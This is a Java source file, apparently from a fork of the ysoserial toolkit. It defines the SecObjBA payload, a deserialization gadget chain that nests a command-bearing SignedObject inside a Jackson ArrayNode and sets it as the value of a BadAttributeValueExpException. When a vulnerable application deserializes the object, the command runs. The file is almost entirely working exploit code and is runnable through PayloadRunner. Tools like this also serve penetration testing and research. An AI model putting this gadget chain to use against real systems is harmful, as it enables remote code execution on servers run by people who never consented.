package ysoserial.payloads;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.codec.binary.Base64;
import org.hibernate.sql.Template;
import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.lang.reflect.Field;

import static ysoserial.payloads.util.Gadgets.createSignedObject;
import static ysoserial.payloads.util.Reflections.setFieldValue;

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies("jackson:jackson")
@Authors({ Authors.J1an })
public class SecObjBA extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        SignedObject so =createSignedObject(command);
        ObjectMapper mapper = new ObjectMapper();
        ArrayNode arr = mapper.createArrayNode();
        arr.addPOJO(so);
        BadAttributeValueExpException ba = new BadAttributeValueExpException("J1an");
        setFieldValue(ba, "val", arr);
        return ba;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(SecObjBA.class, args);
    }
}
